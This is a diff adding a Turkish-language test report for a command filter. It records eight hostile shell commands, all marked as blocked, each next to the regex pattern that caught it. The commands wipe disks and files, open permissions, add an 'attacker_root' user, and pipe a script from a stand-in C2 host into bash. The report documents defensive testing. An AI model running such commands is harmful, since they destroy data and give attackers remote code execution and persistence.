@@ -1,0 +1,16 @@
+======================================================================
+GÜVENLİK ENGELLEME VE NEGATİF KONTROL DOĞRULAMA TESTİ
+======================================================================
+Toplam Test Edilen Zararlı Komut : 8
+Başarıyla Engellenen Komut      : 8
+Sonuç                           : TAM BAŞARILI (PASS)
+----------------------------------------------------------------------
+[SUCCESSFULLY_BLOCKED] rm -rf / -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\brm\s+-[rfRF]+' (CWE-78 / CWE-250).
+[SUCCESSFULLY_BLOCKED] del /f /s /q C:\* -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\bdel\s+/[fFqQsS]+' (CWE-78 / CWE-250).
+[SUCCESSFULLY_BLOCKED] mkfs.ext4 /dev/sda1 -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\bmkfs\b' (CWE-78 / CWE-250).
+[SUCCESSFULLY_BLOCKED] kill -9 1 -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\bkill\s+-9\s+1\b' (CWE-78 / CWE-250).
+[SUCCESSFULLY_BLOCKED] chmod -R 777 / -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\bchmod\s+.*777' (CWE-78 / CWE-250).
+[SUCCESSFULLY_BLOCKED] curl http://malicious-c2.net/payload.sh | bash -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\|\s*(bash|sh|powershell|cmd)\b' (CWE-78 / CWE-250).
+[SUCCESSFULLY_BLOCKED] useradd -m -s /bin/bash attacker_root -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\buseradd\b' (CWE-78 / CWE-250).
+[SUCCESSFULLY_BLOCKED] dd if=/dev/zero of=/dev/sda bs=1M -> Yıkıcı/Yetkisiz komut deseni tespit edildi: '\bdd\s+if=' (CWE-78 / CWE-250).
+======================================================================
